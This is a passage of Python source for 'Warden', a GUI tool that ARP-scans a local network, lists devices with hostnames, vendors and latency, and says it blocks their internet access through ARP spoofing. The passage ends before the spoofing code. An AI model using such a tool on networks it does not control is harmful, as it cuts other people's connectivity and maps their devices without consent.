"""
Warden: Network Control

Scans the local network using ARP, displays connected devices,
and lets the user block or restore internet access per device via ARP spoofing.

Requires root privileges to send raw Layer 2 packets.
Run with: sudo python3 warden.py
"""

import sys, threading, time, socket, subprocess, re

# Partial OUI lookup table mapping the first 3 bytes of a MAC address to a manufacturer name.
# Used to show the device brand when a full hostname cannot be resolved.
OUI_DB = {
    # Apple
    "00:1b:63":"Apple","00:1c:b3":"Apple","00:1d:4f":"Apple","00:21:e9":"Apple",
    "00:22:41":"Apple","00:23:12":"Apple","00:23:32":"Apple","00:25:bc":"Apple",
    "00:26:b0":"Apple","28:cf:e9":"Apple","3c:07:54":"Apple","40:d3:2d":"Apple",
    "40:cb:c0":"Apple","50:32:75":"Apple","54:ae:27":"Apple","60:f8:1d":"Apple",
    "6c:40:08":"Apple","70:48:0f":"Apple","70:ec:e4":"Apple","78:4f:43":"Apple",
    "7c:04:d0":"Apple","88:e9:fe":"Apple","90:b0:ed":"Apple","9c:f3:87":"Apple",
    "a4:d1:8c":"Apple","a8:5c:2c":"Apple","ac:bc:32":"Apple","b8:53:ac":"Apple",
    "bc:92:6b":"Apple","c4:b3:01":"Apple","d4:90:9c":"Apple","dc:a4:ca":"Apple",
    "dc:56:e7":"Apple","f0:18:98":"Apple","f4:5c:89":"Apple","f8:27:93":"Apple",
    "00:3e:e1":"Apple","18:3d:a2":"Apple","1c:57:dc":"Apple","20:ab:37":"Apple",
    "38:f9:d3":"Apple","4c:57:ca":"Apple","58:40:4e":"Apple","64:76:ba":"Apple",
    "80:e6:50":"Apple","8c:85:90":"Apple","98:01:a7":"Apple","a4:c3:61":"Apple",
    # Samsung
    "00:15:99":"Samsung","00:17:d5":"Samsung","00:21:19":"Samsung",
    "50:01:bb":"Samsung","5c:f6:dc":"Samsung","78:40:e4":"Samsung",
    "8c:77:12":"Samsung","a0:10:81":"Samsung","a4:50:46":"Samsung",
    "bc:47:60":"Samsung","cc:07:ab":"Samsung","d4:00:0d":"Samsung",
    "e4:40:e2":"Samsung","f4:09:d8":"Samsung","d8:57:ef":"Samsung",
    "00:26:37":"Samsung","14:49:e0":"Samsung","30:cd:a7":"Samsung",
    "34:31:11":"Samsung","50:f0:d3":"Samsung","5c:51:4f":"Samsung",
    "60:a1:0a":"Samsung","68:27:37":"Samsung","70:f9:27":"Samsung",
    "84:25:db":"Samsung","8c:f5:a3":"Samsung","90:18:7c":"Samsung",
    "94:35:0a":"Samsung","a0:82:1f":"Samsung","b8:5a:73":"Samsung",
    # Huawei
    "00:1e:10":"Huawei","00:25:9e":"Huawei","04:bd:70":"Huawei",
    "04:f9:38":"Huawei","08:19:a6":"Huawei","1c:1d:67":"Huawei",
    "20:f3:a3":"Huawei","28:31:52":"Huawei","2c:9d:1e":"Huawei",
    "34:6b:d3":"Huawei","38:bc:01":"Huawei","3c:a8:2a":"Huawei",
    "48:00:31":"Huawei","48:db:50":"Huawei","54:51:1b":"Huawei",
    "54:89:98":"Huawei","58:2a:f7":"Huawei","5c:c3:07":"Huawei",
    "68:13:24":"Huawei","6c:b7:f4":"Huawei","70:72:3c":"Huawei",
    "80:d0:9b":"Huawei","8c:34:fd":"Huawei","90:17:3f":"Huawei",
    "a4:c6:4f":"Huawei","ac:e2:15":"Huawei","b8:08:d7":"Huawei",
    "cc:96:a0":"Huawei","d4:6e:5c":"Huawei","e8:cd:2d":"Huawei",
    # Xiaomi
    "00:9e:c8":"Xiaomi","10:2a:b3":"Xiaomi","14:f6:5a":"Xiaomi",
    "18:59:36":"Xiaomi","20:82:c0":"Xiaomi","28:6c:07":"Xiaomi",
    "34:80:b3":"Xiaomi","38:a4:ed":"Xiaomi","50:8f:4c":"Xiaomi",
    "58:44:98":"Xiaomi","64:b4:73":"Xiaomi","68:df:dd":"Xiaomi",
    "6c:5a:b0":"Xiaomi","74:23:44":"Xiaomi","7c:1d:d9":"Xiaomi",
    "8c:be:be":"Xiaomi","98:fa:e3":"Xiaomi","a4:77:33":"Xiaomi",
    "ac:f7:f3":"Xiaomi","f0:b4:29":"Xiaomi","fc:64:ba":"Xiaomi",
    # Google
    "00:1a:11":"Google","08:9e:08":"Google","1c:f2:9a":"Google",
    "20:df:b9":"Google","48:d6:d5":"Google","54:60:09":"Google",
    "58:cb:52":"Google","6c:ad:f8":"Google","a4:77:58":"Google",
    "f4:f5:e8":"Google","94:eb:2c":"Google",
    # OnePlus
    "04:4b:ff":"OnePlus","18:26:49":"OnePlus","ac:a6:13":"OnePlus",
    "94:65:2d":"OnePlus",
    # Oppo / Realme
    "00:08:22":"Oppo","ac:b5:7d":"Oppo","04:d9:f5":"Oppo",
    "2c:5b:b8":"Oppo","6c:b7:f4":"Oppo",
    # Vivo
    "00:11:45":"Vivo","5c:e8:eb":"Vivo","ec:5a:f2":"Vivo",
    # Sony
    "00:1a:80":"Sony","00:1d:0d":"Sony","00:24:ef":"Sony",
    "10:08:b1":"Sony","28:48:46":"Sony","30:17:c8":"Sony",
    "40:b8:37":"Sony","54:42:49":"Sony","58:48:22":"Sony",
    "78:84:3c":"Sony","b8:86:87":"Sony","d0:19:99":"Sony",
    # Windows / Microsoft
    "00:03:ff":"Microsoft","00:0d:3a":"Microsoft","00:12:5a":"Microsoft",
    "00:15:5d":"Microsoft","00:17:fa":"Microsoft","00:1d:d8":"Microsoft",
    "00:22:48":"Microsoft","00:25:ae":"Microsoft","28:18:78":"Microsoft",
    "48:50:73":"Microsoft","60:45:bd":"Microsoft","7c:1e:52":"Microsoft",
    # Dell
    "00:06:5b":"Dell","00:08:74":"Dell","00:0b:db":"Dell",
    "00:11:43":"Dell","00:12:3f":"Dell","00:14:22":"Dell",
    "00:1a:a0":"Dell","00:1c:23":"Dell","00:1e:4f":"Dell",
    "00:21:70":"Dell","18:03:73":"Dell","18:66:da":"Dell",
    "24:b6:fd":"Dell","34:17:eb":"Dell","44:a8:42":"Dell",
    "78:2b:cb":"Dell","84:8f:69":"Dell","b0:83:fe":"Dell",
    # Lenovo
    "00:1c:25":"Lenovo","04:5d:4b":"Lenovo","28:d2:44":"Lenovo",
    "40:8d:5c":"Lenovo","54:ee:75":"Lenovo","60:02:b4":"Lenovo",
    "70:5a:0f":"Lenovo","88:70:8c":"Lenovo","98:fa:9b":"Lenovo",
    "c8:5b:76":"Lenovo","e4:a7:c5":"Lenovo","f8:16:54":"Lenovo",
    # Raspberry Pi
    "b8:27:eb":"Raspberry Pi","dc:a6:32":"Raspberry Pi","e4:5f:01":"Raspberry Pi",
    # Nintendo
    "00:09:bf":"Nintendo","00:16:56":"Nintendo","00:17:ab":"Nintendo",
    "00:19:1d":"Nintendo","00:1a:e9":"Nintendo","00:1b:ea":"Nintendo",
    "00:1c:be":"Nintendo","00:1e:35":"Nintendo","00:1f:32":"Nintendo",
    "58:bd:a3":"Nintendo","98:b6:e9":"Nintendo",
}

def _oui_vendor(mac: str) -> str:
    """Return the manufacturer name from the first 3 bytes of a MAC address, or an empty string."""
    prefix = mac.lower()[:8]
    return OUI_DB.get(prefix, "")

def _is_random_mac(mac: str) -> bool:
    """
    Return True if the MAC address appears to be randomly generated.

    iOS 14+, Android 10+, and Windows 10+ randomise MAC addresses by default,
    setting the locally-administered bit (bit 1 of the first byte).
    A randomised MAC has no real OUI so vendor lookup will always return empty.
    """
    try:
        return bool(int(mac.split(":")[0], 16) & 0x02)
    except Exception:
        return False

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QLineEdit, QTableWidget, QTableWidgetItem,
    QHeaderView, QFrame, QMessageBox, QAbstractItemView, QSizePolicy,
    QStackedWidget, QSpacerItem
)
from PyQt5.QtCore import Qt, pyqtSignal, QObject
from PyQt5.QtGui  import QColor, QFont

from scapy.all import ARP, Ether, srp, sendp, getmacbyip, conf, get_if_addr, get_if_hwaddr

# Color palette for the dark theme.
BG      = "#1a1b2e"
SURF    = "#252640"
SURF2   = "#16213e"
ACCENT  = "#7c3aed"
DANGER  = "#ef4444"
SUCCESS = "#22c55e"
WARNING = "#f59e0b"
FG      = "#e2e8f0"
FGDIM   = "#94a3b8"
BORDER  = "#334155"
ROW_A   = "#252640"
ROW_B   = "#1e1e2e"
ROW_BLK = "#3d1212"

# Global Qt stylesheet applied to the entire application window.
# Overrides default widget appearance to match the dark theme.
APP_STYLE = f"""
QMainWindow, QWidget      {{ background: {BG}; color: {FG}; font-family: 'Helvetica Neue', Helvetica, Arial; font-size: 13px; }}
QFrame                    {{ background: {BG}; }}
QLineEdit                 {{ background: {SURF}; color: {FG}; border: 1px solid {BORDER}; border-radius: 2px; padding: 5px 8px; font-family: Menlo, Courier; }}
QLineEdit:focus           {{ border-color: {BORDER}; }}
QTableWidget              {{ background: {SURF}; color: {FG}; gridline-color: {BORDER}; border: none; selection-background-color: {ACCENT}; font-family: Menlo, Courier; font-size: 12px; }}
QTableWidget::item        {{ padding: 0 8px; border: none; }}
QHeaderView::section      {{ background: {SURF2}; color: {FGDIM}; font-weight: bold; font-size: 11px; border: none; padding: 8px; }}
QScrollBar:vertical       {{ background: {SURF}; width: 8px; margin: 0; border: none; }}
QScrollBar::handle:vertical {{ background: {BORDER}; border-radius: 4px; min-height: 24px; }}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; }}
QMessageBox               {{ background: {SURF}; }}
QToolTip                  {{ background: {SURF2}; color: {FG}; border: 1px solid {BORDER}; padding: 5px 9px; border-radius: 4px; font-size: 12px; }}
"""

def _btn(text, bg=ACCENT, hover=None):
    """Create a styled QPushButton with a consistent dark theme appearance."""
    hover = hover or bg
    b = QPushButton(text)
    b.setCursor(Qt.PointingHandCursor)
    b.setStyleSheet(f"""
        QPushButton {{
            background: {bg}; color: white; border: none;
            border-radius: 2px; padding: 7px 16px;
            font-size: 12px; font-weight: 500;
        }}
        QPushButton:hover   {{ background: {hover}; }}
        QPushButton:disabled {{ background: {BORDER}; color: {FGDIM}; }}
    """)
    return b

def _alert(parent, text):
    """Show a minimal dialog with no icon, just the given message and an OK button."""
    d = QMessageBox(parent)
    d.setWindowTitle("Warden")
    d.setText(text)
    d.setIcon(QMessageBox.NoIcon)
    d.setStandardButtons(QMessageBox.Ok)
    d.setStyleSheet(f"""
        QMessageBox  {{ background: {SURF2}; }}
        QLabel       {{ color: {FG}; font-size: 13px; background: transparent; }}
        QPushButton  {{ background: {SURF}; color: {FG}; border: 1px solid {BORDER};
                        border-radius: 2px; padding: 5px 20px; font-size: 12px;
                        min-width: 60px; }}
        QPushButton:hover {{ background: {BORDER}; }}
    """)
    d.exec_()

def _label(text, color=FG, size=12, bold=False, bg="transparent"):
    """Create a styled QLabel with the given color, font size, and weight."""
    l = QLabel(text)
    weight = "bold" if bold else "normal"
    l.setStyleSheet(f"color:{color}; font-size:{size}px; font-weight:{weight}; background:{bg};")
    return l


class _Bridge(QObject):
    """
    Allows background threads to safely schedule calls on the Qt main thread.

    Any thread can emit call(fn) and fn() will be executed in the main thread
    via Qt's signal/slot mechanism, which is thread-safe by design.
    """
    call = pyqtSignal(object)


class WardenApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Warden — Network Control")
        self.resize(1020, 700)
        self.setMinimumSize(840, 540)

        # Background threads emit _bridge.call(fn) to run fn() safely on the main thread.
        self._bridge = _Bridge()
        self._bridge.call.connect(lambda fn: fn())

        self.gateway_ip   = "192.168.0.1"
        self.gateway_mac  = ""
        self.iface        = conf.iface
        self.my_mac       = ""
        self.scan_running = False
        self._arp_names: dict = {}  # ip -> hostname from the most recent arp -a run
        self.devices: dict    = {}  # ip -> {mac, hn, status, running, thread, ping_ms}
        self.ip_to_row: dict  = {}  # ip -> table row index (must stay stable while table is active)

        self._build()

    def _ui(self, fn):
        """Schedule fn() to execute in the Qt main thread from any background thread."""
        self._bridge.call.emit(fn)

    def _build(self):
        root = QWidget()
        self.setCentralWidget(root)
        vbox = QVBoxLayout(root)
        vbox.setSpacing(0)
        vbox.setContentsMargins(0, 0, 0, 0)

        # Header bar
        hdr = QFrame()
        hdr.setFixedHeight(58)
        hdr.setStyleSheet(f"background:{SURF2}; border-bottom:1px solid {BORDER};")
        hl = QHBoxLayout(hdr)
        hl.setContentsMargins(20, 0, 20, 0)

        hl.addWidget(_label("  Warden", FG, 20, bold=True, bg="transparent"))
        hl.addSpacing(10)
        hl.addWidget(_label("Network Control", "#a78bfa", 12, bg="transparent"))
        hl.addStretch()
        vbox.addWidget(hdr)

        # Toolbar: gateway IP input, scan button, and live interface/MAC info labels
        tb = QFrame()
        tb.setFixedHeight(54)
        tb.setStyleSheet(f"background:{SURF}; border-bottom:1px solid {BORDER};")
        tl = QHBoxLayout(tb)
        tl.setContentsMargins(16, 0, 16, 0)
        tl.setSpacing(10)

        tl.addWidget(_label("Gateway IP:", FGDIM, 11, bg="transparent"))

        self.gw_entry = QLineEdit(self.gateway_ip)
        self.gw_entry.setFixedWidth(155)
        self.gw_entry.setFixedHeight(34)
        self.gw_entry.setAttribute(Qt.WA_MacShowFocusRect, False)
        self.gw_entry.textChanged.connect(lambda t: setattr(self, "gateway_ip", t))
        tl.addWidget(self.gw_entry)

        self.scan_btn = _btn(" Scan Network ", ACCENT, "#6d28d9")
        self.scan_btn.setFixedHeight(34)
        self.scan_btn.clicked.connect(self._start_scan)
        tl.addWidget(self.scan_btn)

        self.iface_lbl  = _label("Interface: —",  FGDIM, 10, bg="transparent")
        self.gw_mac_lbl = _label("  GW MAC: —",   FGDIM, 10, bg="transparent")
        tl.addWidget(self.iface_lbl)
        tl.addWidget(self.gw_mac_lbl)
        tl.addStretch()

        self.count_lbl = _label("", ACCENT, 12, bold=True, bg="transparent")
        tl.addWidget(self.count_lbl)
        vbox.addWidget(tb)

        # Main content area: a stacked widget that switches between an empty
        # state placeholder (page 0) and the live device table (page 1).
        self.stack = QStackedWidget()

        # Page 0: shown before any scan has been run
        empty_page = QWidget()
        empty_page.setStyleSheet(f"background:{SURF};")
        ep = QVBoxLayout(empty_page)
        ep.setContentsMargins(0, 0, 0, 0)
        ep.addStretch(2)
        ico_lbl = QLabel("⬡")
        ico_lbl.setAlignment(Qt.AlignCenter)
        ico_lbl.setStyleSheet(f"color:{BORDER}; font-size:56px; background:transparent;")
        ep.addWidget(ico_lbl)
        ep.addSpacing(14)
        msg_lbl = QLabel("No devices found")
        msg_lbl.setAlignment(Qt.AlignCenter)
        msg_lbl.setStyleSheet(f"color:{FG}; font-size:16px; font-weight:bold; background:transparent;")
        ep.addWidget(msg_lbl)
        ep.addSpacing(6)
        sub_lbl = QLabel("Enter your gateway IP in the toolbar, then click  Scan Network.")
        sub_lbl.setAlignment(Qt.AlignCenter)
        sub_lbl.setStyleSheet(f"color:{FGDIM}; font-size:12px; background:transparent;")
        ep.addWidget(sub_lbl)
        ep.addSpacing(10)
        hint_lbl = QLabel("Make sure to run the app with  sudo  so ARP packets can be sent.")
        hint_lbl.setAlignment(Qt.AlignCenter)
        hint_lbl.setStyleSheet(f"color:{BORDER}; font-size:11px; background:transparent;")
        ep.addWidget(hint_lbl)
        ep.addStretch(3)
        self.stack.addWidget(empty_page)      # index 0

        # Page 1: device table, populated after a successful scan
        self.table = QTableWidget(0, 5)
        self.table.setHorizontalHeaderLabels(
            ["IP Address", "MAC Address", "Device Name", "Latency", "Status"])
        hh = self.table.horizontalHeader()
        hh.setSectionResizeMode(0, QHeaderView.Fixed)
        hh.setSectionResizeMode(1, QHeaderView.Fixed)
        hh.setSectionResizeMode(2, QHeaderView.Stretch)
        hh.setSectionResizeMode(3, QHeaderView.Fixed)
        hh.setSectionResizeMode(4, QHeaderView.Fixed)
        self.table.setColumnWidth(0, 155)
        self.table.setColumnWidth(1, 175)
        self.table.setColumnWidth(3, 110)
        self.table.setColumnWidth(4, 110)
        self.table.verticalHeader().setVisible(False)
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.setAlternatingRowColors(True)
        self.table.setShowGrid(True)
        self.table.setStyleSheet(f"QTableWidget {{ alternate-background-color: {ROW_B}; }}")
        self.table.verticalHeader().setDefaultSectionSize(36)
        # Sorting is intentionally disabled. Enabling it causes Qt to physically
        # reorder rows, which breaks ip_to_row and sends cell updates to the wrong row.
        self.table.itemSelectionChanged.connect(self._on_selection_changed)
        self.stack.addWidget(self.table)      # index 1

        vbox.addWidget(self.stack)

        # Control bar with per-device and bulk block/unblock actions
        ctrl = QFrame()
        ctrl.setFixedHeight(54)
        ctrl.setStyleSheet(f"background:{SURF}; border-top:1px solid {BORDER};")
        cl = QHBoxLayout(ctrl)
        cl.setContentsMargins(16, 0, 16, 0)
        cl.setSpacing(8)

        cl.addWidget(_label("Selection:", FGDIM, 11, bg="transparent"))

        self.block_btn   = _btn("  Block",   DANGER,   "#b91c1c")
        self.unblock_btn = _btn("  Unblock", "#374151", "#4b5563")
        self.block_btn.setToolTip("Cut internet access for the selected device(s)\n"
                                  "Their traffic is redirected here and dropped.")
        self.unblock_btn.setToolTip("Restore internet access for the selected device(s)")

        # Thin vertical divider between the selection controls and the bulk controls
        div = QFrame(); div.setFrameShape(QFrame.VLine)
        div.setStyleSheet(f"color:{BORDER};"); div.setFixedWidth(1)

        self.block_all_btn   = _btn("  Block All",   DANGER,   "#b91c1c")
        self.unblock_all_btn = _btn("  Unblock All", "#374151", "#4b5563")
        self.block_all_btn.setToolTip("Block every device on the network at once")
        self.unblock_all_btn.setToolTip("Restore internet access for all blocked devices")

        self.block_btn.clicked.connect(self._block_selected)
        self.unblock_btn.clicked.connect(self._unblock_selected)
        self.block_all_btn.clicked.connect(self._block_all)
        self.unblock_all_btn.clicked.connect(self._unblock_all)

        self.clear_btn = _btn("Clear List", "#374151", "#4b5563")
        self.clear_btn.setToolTip("Unblock all devices and clear the table")
        self.clear_btn.clicked.connect(self._clear_table)

        for b in [self.block_btn, self.unblock_btn]:
            b.setFixedHeight(36); cl.addWidget(b)

        cl.addSpacing(4); cl.addWidget(div); cl.addSpacing(4)
        cl.addWidget(_label("All:", FGDIM, 11, bg="transparent"))

        for b in [self.block_all_btn, self.unblock_all_btn]:
            b.setFixedHeight(36); cl.addWidget(b)

        cl.addStretch()
        self.clear_btn.setFixedHeight(36)
        cl.addWidget(self.clear_btn)
        vbox.addWidget(ctrl)

        # Set initial button enabled/disabled state before any scan or selection
        self._on_selection_changed()

        # Status bar
        sb = QFrame()
        sb.setFixedHeight(30)
        sb.setStyleSheet(f"background:{SURF2}; border-top:1px solid {BORDER};")
        sl = QHBoxLayout(sb)
        sl.setContentsMargins(12, 0, 12, 0)
        sl.setSpacing(6)

        self.dot_lbl    = _label("●", SUCCESS, 11, bg="transparent")
        self.status_lbl = _label("Ready — click Scan Network to begin", FG, 10, bg="transparent")
        sl.addWidget(self.dot_lbl)
        sl.addWidget(self.status_lbl)
        sl.addStretch()
        vbox.addWidget(sb)

    def _on_selection_changed(self):
        """Update button enabled states based on the current table selection."""
        ips = self._selected_ips()
        has_sel        = bool(ips)
        any_blocked    = any(self.devices.get(ip, {}).get("status") == "Blocked" for ip in ips)
        any_unblocked  = any(self.devices.get(ip, {}).get("status") != "Blocked" for ip in ips)
        gw_known       = bool(self.gateway_mac)

        self.block_btn.setEnabled(has_sel and any_unblocked and gw_known)
        self.unblock_btn.setEnabled(has_sel and any_blocked)

        any_dev_blocked = any(d.get("status") == "Blocked" for d in self.devices.values())
        self.unblock_all_btn.setEnabled(any_dev_blocked)

    def _set_status(self, msg, color=FG):
        self._ui(lambda: (
            self.status_lbl.setText(msg),
            self.dot_lbl.setStyleSheet(f"color:{color}; font-size:11px; background:transparent;")
        ))

    def _cell(self, text, fg=None, bg=None, center=False):
        item = QTableWidgetItem(text)
        item.setFlags(Qt.ItemIsSelectable | Qt.ItemIsEnabled)
        if center:
            item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
        else:
            item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
        if fg:
            item.setForeground(QColor(fg))
        if bg:
            item.setBackground(QColor(bg))
        return item

    def _set_row_bg(self, row, color=None):
        bg = color or (ROW_A if row % 2 == 0 else ROW_B)
        for col in range(5):
            item = self.table.item(row, col)
            if item:
                item.setBackground(QColor(bg))

    # Scanning

    def _start_scan(self):
        if self.scan_running:
            return
        self.scan_running = True
        self.scan_btn.setEnabled(False)
        self._set_status("Scanning network…", WARNING)
        threading.Thread(target=self._scan, daemon=True).start()

    def _scan(self):
        """
        Main scan routine. Runs in a background thread.

        Steps:
          1. Determine the correct network interface and local IP for the given gateway.
          2. Resolve the gateway's MAC address.
          3. Send an ARP broadcast to discover all devices on the /24 subnet.
          4. Fall back to the OS ARP cache if the live sweep returns nothing.
          5. Spawn a ping thread and a name resolution thread for each new device.
          6. Kick off a delayed second-pass name lookup to catch late mDNS responses.
        """
        gw     = self.gateway_ip.strip()
        subnet = ".".join(gw.split(".")[:3]) + ".0/24"

        try:
            self.iface = conf.route.route(gw)[0]
        except Exception:
            self.iface = conf.iface
        my_ip = get_if_addr(self.iface) or gw
        try:
            self.my_mac = get_if_hwaddr(self.iface)
        except Exception:
            self.my_mac = ""
        self._ui(lambda: self.iface_lbl.setText(f"Interface: {self.iface} ({my_ip})"))

        try:
            self.gateway_mac = getmacbyip(gw) or ""
        except Exception:
            self.gateway_mac = ""
        if not self.gateway_mac:
            self.gateway_mac = self._mac_from_cache(gw)
        mac_txt = f"  GW MAC: {self.gateway_mac}" if self.gateway_mac else "  GW MAC: (not found)"
        self._ui(lambda t=mac_txt: self.gw_mac_lbl.setText(t))

        # ARP sweep: send a broadcast ARP request to every address on the /24 subnet
        found = []
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet, psrc=my_ip),
                iface=self.iface, timeout=3, verbose=False)
            found = [(r.psrc, r.hwsrc) for _, r in ans
                     if r.psrc != gw and not r.psrc.endswith(".255")]
        except PermissionError:
            self._set_status("Permission denied — run with sudo", DANGER)
            self._ui(lambda: (self.scan_btn.setEnabled(True),
                              setattr(self, "scan_running", False)))
            return
        except Exception:
            pass

        # Fall back to the cached ARP table if the live sweep found nothing.
        # This can happen when AP isolation blocks Layer 2 broadcasts.
        if not found:
            found = self._read_arp_cache(gw, subnet)

        # Run arp -a once now so mDNS hostnames are available for immediate display.
        self._arp_names = self._bulk_arp_names()

        # Insert a row for each new device immediately, then resolve names in the background.
        new_count = 0
        for ip, mac in found:
            if ip not in self.ip_to_row:
                self.devices[ip] = {
                    "mac": mac, "hn": "resolving…",
                    "status": "Online", "running": False,
                    "thread": None, "ping_ms": "—"
                }
                self._ui(lambda i=ip, m=mac: self._insert_row(i, m, "resolving…"))
                new_count += 1
                threading.Thread(target=self._ping_loop,    args=(ip,),      daemon=True).start()
                threading.Thread(target=self._resolve_name, args=(ip, mac),  daemon=True).start()

        # mDNSResponder sometimes needs a few seconds to resolve newly discovered devices,
        # so a second name lookup pass runs after a short delay.
        threading.Thread(target=self._delayed_name_refresh, daemon=True).start()

        # _finish reads rowCount() after all queued _insert_row calls have executed,
        # so the displayed count always matches the actual number of rows in the table.
        def _finish():
            n = self.table.rowCount()
            self.scan_btn.setEnabled(True)
            self.scan_running = False
            self.count_lbl.setText(f"{n} device{'s' if n != 1 else ''}")
            self.status_lbl.setText(f"Scan complete — {n} device{'s' if n != 1 else ''} in list")
            self.dot_lbl.setStyleSheet(f"color:{SUCCESS}; font-size:11px; background:transparent;")
        self._ui(_finish)

    def _insert_row(self, ip, mac, hn):
        """Insert a new row into the device table. Must only be called from the Qt main thread."""
        if ip in self.ip_to_row:
            return
        if self.table.rowCount() == 0:
            self.stack.setCurrentIndex(1)   # switch from empty state to table
        row = self.table.rowCount()
        self.table.insertRow(row)
        self.ip_to_row[ip] = row
        self.table.setItem(row, 0, self._cell(ip))
        self.table.setItem(row, 1, self._cell(mac))
        self.table.setItem(row, 2, self._cell(hn, FGDIM))
        self.table.setItem(row, 3, self._cell("—",      FGDIM,  center=True))
        self.table.setItem(row, 4, self._cell("Online", SUCCESS, center=True))

    def _resolve_name(self, ip: str, mac: str):
        """
        Resolve a human-readable name for the given device. Runs in a background thread.

        Resolution order:
          1. ARP name cache: populated right after the scan. macOS includes
             Bonjour/mDNS hostnames here (e.g. "Muhammads-iPhone").
          2. socket.gethostbyaddr: a direct DNS/mDNS lookup for names not yet
             present in the ARP cache.
          3. OUI vendor database: used as a last resort to show the manufacturer.

        The result is written back to the device table via the UI bridge.
        """
        name = ""

        # Check the ARP name cache first since it was populated right after the scan
        name = self._arp_names.get(ip, "")

        # Fall back to a direct system resolver call, which is mDNS-aware on macOS
        if not name:
            result = [None]
            def _lookup():
                try:
                    result[0] = socket.gethostbyaddr(ip)[0]
                except Exception:
                    pass
            t = threading.Thread(target=_lookup, daemon=True)
            t.start()
            t.join(timeout=3)
            if result[0] and result[0] != ip:
                candidate = re.sub(r'\.local$', '', result[0], flags=re.I)
                if candidate:
                    name = candidate

        # Append a vendor or privacy tag so the demo clearly shows both the
        # hostname and the MAC address type side by side
        vendor = _oui_vendor(mac)
        if name:
            # Hostname resolved. Append a vendor or privacy tag alongside it.
            if vendor:
                name = f"{name}  [{vendor}]"
            elif _is_random_mac(mac):
                name = f"{name}  [Private MAC]"
            # else: real MAC with unknown vendor, show the name as-is
        else:
            # No hostname found. Fall back to showing the vendor tag or privacy label.
            if vendor:
                name = f"[{vendor}]"
            elif _is_random_mac(mac):
                name = "[Private MAC]"
            else:
                name = "—"

        if ip in self.devices:
            self.devices[ip]["hn"] = name
        self._ui(lambda i=ip, n=name: self._update_name(i, n))

    def _update_name(self, ip: str, name: str):
        """Update the Device Name cell for the given IP. Must be called from the main thread."""
        row = self.ip_to_row.get(ip)
        if row is None:
            return
        item = self.table.item(row, 2)
        if item:
            item.setText(name)
            # Dim vendor tags and fallback labels. Use full brightness for real hostnames.
            is_tag_only = name.startswith("[") or name == "—"
            item.setForeground(QColor(FGDIM if is_tag_only else FG))

    # ARP cache helpers and hostname resolution utilities

    def _bulk_arp_names(self) -> dict:
        """
        Run 'arp -a' without the -n flag and return a dict mapping IP to hostname.

        Without -n, macOS resolves Bonjour/mDNS names in the ARP output, giving
        us device names like "Muhammads-iPhone" or "Galaxy-S22" at no extra cost.
        """
        names = {}
        try:
            out = subprocess.check_output(
                ["arp", "-a"], stderr=subprocess.DEVNULL, text=True, timeout=5)
            for line in out.splitlines():
                # Expected format: "Muhammads-iPhone (192.168.x.x) at aa:bb:cc on en0 ..."
                # Unknown entries look like:  "? (192.168.x.x) at ..."
                m = re.match(r'^([^?\s]\S*)\s+\((\d+\.\d+\.\d+\.\d+)\)', line)
                if m:
                    host, ip = m.group(1), m.group(2)
                    host = re.sub(r'\.local$', '', host, flags=re.I)
                    if host and host != ip:
                        names[ip] = host
        except Exception:
            pass
        return names

    def _delayed_name_refresh(self):
        """
        Re-run arp -a after a short delay and update any rows still showing fallback labels.

        mDNSResponder sometimes takes a few seconds to resolve names for newly
        discovered devices. This second pass catches names that were not available
        immediately after the scan.
        """
        time.sleep(4)
        fresh = self._bulk_arp_names()
        for ip, d in list(self.devices.items()):
            if ip in fresh and d.get("hn") in ("—", "[Private MAC]", "", "resolving…"):
                name = fresh[ip]
                d["hn"] = name
                self._ui(lambda i=ip, n=name: self._update_name(i, n))

    def _mac_from_cache(self, ip):
        """Look up a MAC address from the OS ARP cache for a specific IP."""
        try:
            out = subprocess.check_output(["arp", "-n", ip],
                                          stderr=subprocess.DEVNULL, text=True)
            for p in out.split():
                if re.match(r"^([0-9a-f]{1,2}:){5}[0-9a-f]{1,2}$", p, re.I):
                    return p
        except Exception:
            pass
        return ""

    def _read_arp_cache(self, gw, subnet):
        """
        Read the OS ARP cache and return a list of (ip, mac) tuples on the given subnet.

        Used as a fallback when the live ARP sweep returns no results, which can
        happen if AP isolation is enabled on the access point.
        """
        prefix = ".".join(gw.split(".")[:3]) + "."
        found  = []
        try:
            out = subprocess.check_output(["arp", "-an"],
                                          stderr=subprocess.DEVNULL, text=True)
            for line in out.splitlines():
                m = re.search(r'\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-f:]+)',
                              line, re.I)
                if not m:
                    continue
                ip, mac = m.group(1), m.group(2).lower()
                if (ip == gw or ip.endswith(".255")
                        or mac in ("ff:ff:ff:ff:ff:ff", "(incomplete)")
                        or not ip.startswith(prefix)
                        or mac.startswith("01:") or mac.startswith("1:")):
                    continue
                found.append((ip, mac))
        except Exception:
            pass
        return found

    # Latency measurement

    def _ping_loop(self, ip):
        """Continuously ping the given IP every 2 seconds and update the Latency column."""
        while ip in self.devices:
            # Skip pinging while the device is blocked. The spoof loop owns the latency column then.
            if self.devices.get(ip, {}).get("status") == "Blocked":
                time.sleep(2)
                continue
            ms = self._ping_once(ip)
            if ip not in self.devices:
                break
            self.devices[ip]["ping_ms"] = ms if ms is not None else "timeout"
            self._ui(lambda i=ip, p=self.devices[ip]["ping_ms"]: self._update_ping(i, p))
            time.sleep(2)

    def _ping_once(self, ip):
        """Send a single ICMP ping and return the round-trip time in milliseconds, or None on failure."""
        try:
            out = subprocess.check_output(
                ["ping", "-c", "1", "-W", "1000", "-t", "1", ip],
                stderr=subprocess.DEVNULL, text=True)
            m = re.search(r'time[=<]([\d.]+)', out)
            return int(float(m.group(1))) if m else None
        except Exception:
            return None

    def _update_ping(self, ip, ping):
        row = self.ip_to_row.get(ip)
        if row is None:
            return
        if isinstance(ping, int):
            ping_s = f"{ping} ms"
            color  = SUCCESS if ping < 50 else (WARNING if ping < 200 else DANGER)
        elif ping == "timeout":
            ping_s, color = "timeout", DANGER
        else:
            ping_s, color = str(ping), FGDIM
